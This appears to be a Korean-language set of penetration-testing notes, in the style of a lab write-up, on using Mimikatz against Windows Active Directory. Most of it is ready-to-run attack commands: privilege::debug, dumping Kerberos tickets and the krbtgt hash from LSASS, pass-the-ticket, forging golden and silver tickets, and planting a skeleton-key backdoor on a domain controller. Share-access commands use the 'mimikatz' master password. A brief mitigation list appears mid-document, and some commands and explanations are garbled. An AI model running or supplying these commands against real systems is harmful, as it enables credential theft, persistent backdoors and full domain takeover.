
https://github.com/gentilkiwi/mimikatz
# Mimikatz 활용 가이드

Mimikatz는 Windows 시스템의 메모리에서 평문 비밀번호, NTLM/Kerberos 해시, Kerberos 티켓 등을 추출하는 데 사용되는 강력한 후기 침투(Post-Exploitation) 도구입니다. 이 도구는 도메인 환경에서 권한 상승 및 측면 이동 공격에 필수적으로 활용됩니다.

> **주의:** Mimikatz는 대부분의 백신(AV) 및 EDR(Endpoint Detection and Response) 솔루션에 의해 악성 코드로 탐지되므로, 사용 시 각별한 주의가 필요합니다.

---

### **1. 기본 사용법**

- **목표:** Mimikatz를 실행하고 필요한 권한을 획득합니다.

```powershell(title="Mimikatz 실행 및 디버그 권한 획득")
# Mimikatz 실행 (관리자 권한 필요)
C:\Path\To\mimikatz.exe

# Mimikatz 프롬프트에서 디버그 권한 획득 (LSASS 접근을 위해 필수)
privilege::debug
```

---

### **2. Pass-the-Ticket (PtT)**

- **개념:** Kerberos 티켓(TGT 또는 서비스 티켓)을 덤프하여 비밀번호 없이 다른 시스템에 인증하는 기법입니다. 공격자는 티켓을 훔쳐 자신의 세션에 주입하여 해당 티켓의 권한을 가장합니다.

#### **티켓 덤프**
```powershell(title="메모리에서 Kerberos 티켓 덤프")
# 현재 시스템의 LSASS 메모리에 캐시된 모든 Kerberos 티켓을 .kirbi 파일로 내보냄
sekurlsa::tickets /export
```

#### **티켓 주입 및 활용**
```powershell(title="덤프된 티켓 주입")
# 덤프된 .kirbi 파일을 현재 세션에 주입하여 해당 티켓의 권한을 가장
kerberos::ptt <path_to_ticket.kirbi>
```

```powershell(title="주입된 티켓 확인")
# Windows 내장 klist 명령어로 현재 세션에 로드된 Kerberos 티켓 확인
klist
```

---

### **3. Golden Ticket (골든 티켓)**

- **개념:** `krbtgt` 계정의 NTLM 해시를 이용하여, 유효 기간이 긴 위조된 TGT(Ticket-Granting Ticket)를 생성합니다. 이 티켓은 도메인 내 모든 서비스에 대한 무제한 접근 권한을 부여하며, 도메인 장악의 궁극적인 목표 중 하나입니다.

#### **`krbtgt` 해시 획득**
```powershell(title="LSASS에서 krbtgt 해시 덤프")
# 도메인 컨트롤러에서 실행 (관리자 권한 필요)
lsadump::lsa /inject /name:krbtgt
```

#### **골든 티켓 생성**
```powershell(title="Mimikatz로 골든 티켓 생성")
# /user: 사칭할 사용자 (예: Administrator)
# /domain: 도메인 이름
# /sid: 도메인 SID
# /krbtgt: krbtgt 계정의 NTLM 해시
# /id: 사칭할 사용자의 RID (Administrator는 보통 500)
kerberos::golden /user:Administrator /domain:<domain.local> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /id:500
```

#### **골든 티켓 활용**
- 생성된 골든 티켓은 자동으로 현재 세션에 주입됩니다. 이제 도메인 컨트롤러의 공유 폴더에 접근하는 등 도메인 관리자 권한을 행사할 수 있습니다.

---

### **4. Silver Ticket (실버 티켓)**

- **개념:** 특정 서비스 계정의 NTLM 해시를 이용하여, 해당 서비스에만 유효한 위조된 서비스 티켓(Service Ticket)을 생성합니다. KDC를 거치지 않고 직접 서비스에 인증할 수 있습니다.

#### **서비스 계정 해시 획득**
```powershell(title="LSASS에서 서비스 계정 해시 덤프")
# 도메인 컨트롤러 또는 서비스가 실행되는 서버에서 실행
lsadump::lsa /inject /name:<service_account_name>
```

#### **실버 티켓 생성**
```powershell(title="Mimikatz로 실버 티켓 생성")
# /user: 사칭할 사용자
# /domain: 도메인 이름
# /sid: 도메인 SID
# /rc4: 서비스 계정의 NTLM 해시
# /spn: 서비스의 SPN (예: cifs/fileserver.domain.local)
# /service: 서비스 이름 (예: cifs)
kerberos::golden /user:Administrator /domain:<domain.local> /sid:<domain_sid> /rc4:<service_account_hash> /spn:<service_spn> /service:<service_name>
```

---

### **5. Skeleton Key (스켈레톤 키)**

- **개념:** 도메인 컨트롤러의 LSASS 프로세스를 패치하여, 모든 도메인 사용자가 특정 "만능 비밀번호"로 로그인할 수 있도록 백도어를 만듭니다. 기존 비밀번호도 여전히 유효합니다.

#### **스켈레톤 키 주입**
```powershell(title="도메인 컨트롤러에 스켈레톤 키 주입")
# 도메인 컨트롤러에서 실행 (관리자 권한 필요)
misc::skeleton
```

#### **스켈레톤 키 활용**
- 주입 후, 모든 도메인 사용자는 기존 비밀번호 외에 "mimikatz"라는 비밀번호로도 로그인할 수 있습니다.

```powershell(title="스켈레톤 키로 공유 폴더 접근")
# Administrator 계정으로 "mimikatz" 비밀번호를 사용하여 DC의 admin$ 공유 접근
net use \<DC_IP>\admin$ /user:Administrator mimikatz
```

---

### **6. 방어 (Mitigation)**

- **크리덴셜 가드(Credential Guard) 및 LSA 보호:** Windows 10/Server 2016 이상에서 LSASS 메모리 보호 기능을 활성화하여 Mimikatz의 직접적인 메모리 접근을 차단합니다.
- **최소 권한의 원칙:** 모든 계정에 최소한의 필요한 권한만 부여하고, 불필요한 고위 권한 계정의 사용을 제한합니다.
- **다단계 인증(MFA):** Kerberos 인증에 MFA를 적용하여 티켓 탈취만으로는 접근이 불가능하게 만듭니다.
- **정기적인 패치 및 업데이트:** 운영체제 및 Active Directory를 최신 상태로 유지하여 알려진 취약점을 제거합니다.






---

#### Pass the Ticket Overview

티켓 전달은 시스템의 LSASS 메모리에서 TGT를 덤프하여 작동합니다. LSASS(로컬 보안 기관 하위 시스템 서비스)는 Active Directory 서버에 자격 증명을 저장하고 게이트키퍼 역할을 하고 제공된 자격 증명을 수락하거나 거부하기 위해 다른 자격 증명 유형과 함께 Kerberos 티켓을 저장할 수 있는 메모리 프로세스입니다. 
해시를 덤프하는 것처럼 LSASS 메모리에서 Kerberos 티켓을 덤프할 수 있습니다.
mimikatz로 티켓을 덤프하면 도메인 관리자 티켓이 LSASS 메모리에 있는 경우 도메인 관리자를 얻는 데 사용할 수 있는 .kirbi 티켓이 제공됩니다. 
이 공격은 보안되지 않은 도메인 서비스 계정 티켓이 있는 경우 권한 상승 및 측면 이동에 적합합니다. 
이 공격을 통해 도메인 관리자의 티켓을 덤프한 다음 mimikatz PTT 공격을 사용하여 해당 티켓을 가장하여 해당 도메인 관리자 역할을 할 수 있는 경우 도메인 관리자로 에스컬레이션할 수 있습니다. 
기존 티켓을 재사용하는 것과 같은 패스 티켓 공격은 티켓을 생성하거나 파괴하지 않고 도메인의 다른 사용자의 기존 티켓을 재사용하고 해당 티켓을 가장하는 것이라고 생각할 수 있습니다.

![[Pasted image 20250803120602.png]]


```powershell
mimikatz.exe
```

```powershell title="in mimikatz"
privilege::debug
```

```powershell
# 이렇게 하면 모든 .kirbi 티켓이 현재 있는 디렉터리로 내보냄
sekurlsa::tickets /export
```
![[Pasted image 20250803120908.png]]
티켓을 찾을 때 위의 빨간색으로 표시된 것과 같이 krbtgt에서 관리자 티켓을 찾는 것이 좋습니다.

```powershell
kerberos::ptt <ticket>
```
![[Pasted image 20250803120941.png]]

```powershell
klist
```
![[Pasted image 20250803121019.png]]
우리는 나머지 공격에 mimikatz를 사용하지 않을 것입니다.

이제 티켓을 사칭하여 사칭하는 TGT와 동일한 권한을 부여했습니다. 이를 확인하기 위해 관리자 공유를 살펴볼 수 있습니다.
![[Pasted image 20250803121043.png]]



#### Golden/Sliver Ticket ATtack Overview

골든 티켓 공격은 도메인에 있는 모든 사용자의 티켓 부여 티켓을 덤프하는 방식으로 작동하며, 이는 도메인 관리자인 것이 바람직하지만 골든 티켓의 경우 krbtgt 티켓을 덤프하고 실버 티켓의 경우 모든 서비스 또는 도메인 관리자 티켓을 덤프합니다. 
이렇게 하면 서비스/도메인 관리자 계정의 SID 또는 각 사용자 계정의 고유 식별자인 보안 식별자와 NTLM 해시가 제공됩니다. 
그런 다음 mimikatz 골든 티켓 공격 내에서 이러한 세부 정보를 사용하여 지정된 서비스 계정 정보를 가장하는 TGT를 만듭니다.


##### Dump the krbtgt hash

```powershell title="in mimikatz:"
privilege::debug
```

```powershell
# 이렇게 하면 골든 티켓을 만드는 데 필요한 보안 식별자뿐만 아니라 해시도 덤프됩니다. 실버 티켓을 만들려면 /name:을 변경하여 도메인 관리자 계정 또는 서비스 계정(예: SQLService 계정)의 해시를 덤프해야 합니다.
lsadump::lsa /inject /name:krbtgt
```
![[Pasted image 20250803121314.png]]


##### Create a Golden/Silver Ticket

```powershell
# 골든 티켓을 생성하기 위한 명령으로, 서비스 NTLM 해시를 krbtgt 슬롯에 입력하고, 서비스 계정의 sid를 sid에 입력하고, ID를 1103으로 변경하기만 하면 실버 티켓을 생성할 수 있음
Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:
```
![[Pasted image 20250803121458.png]]



##### Use the Golden/Silver Ticket to access other machines

```powershell
# Mimikatz에 주어진 티켓이 있는 새로운 관리자 권한 명령 프롬프트가 열립니다.
misc::cmd
```
![[Pasted image 20250803121545.png]]

 원하는 기계에 액세스하면 액세스할 수 있는 항목은 티켓을 받기로 결정한 사용자의 권한에 따라 다르지만 krbtgt에서 티켓을 가져온 경우 전체 네트워크에 액세스할 수 있으므로 골든 티켓이라는 이름이 붙었습니다. 그러나 실버 티켓은 도메인 관리자인 경우 사용자가 액세스할 수 있는 티켓에만 액세스할 수 있으며 거의 전체 네트워크에 액세스할 수 있지만 골든 티켓보다 약간 덜 상승합니다.
 ![[Pasted image 20250803121607.png]]



#### Skeleton Key Overview

![[Pasted image 20250803121935.png]]


스켈레톤 키는 위에서 말했듯이 AS-REQ 암호화 타임 스탬프를 남용하여 작동하며 타임 스탬프는 사용자 NT 해시로 암호화됩니다. 그런 다음 도메인 컨트롤러는 사용자 NT 해시를 사용하여 이 타임스탬프의 암호를 해독하려고 시도하고, 스켈레톤 키가 이식되면 도메인 컨트롤러는 사용자 NT 해시와 스켈레톤 키 NT 해시를 모두 사용하여 타임스탬프의 암호를 해독하여 도메인 포리스트에 액세스할 수 있도록 합니다.


```powershell
privilege::debug
```

```powershell
# 예! 그게 다야, 하지만 이 작은 명령을 과소평가하지 마십시오: 그것은 매우 강력합니다
misc::skeleton
```
![[Pasted image 20250803121733.png]]


##### Accessing the forest

기본 자격 증명은 "_mimikatz_"

example : 

```powershell
# 이제 관리자 암호 없이도 공유에 액세스할 수 있습니다.
net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
```

```powershell
# Desktop-1에 액세스할 수 있는 사용자를 알지 못한 채 Desktop-1의 디렉토리에 액세스합니다.
dir \\Desktop-1\c$ /user:Machine1 mimikatz
```

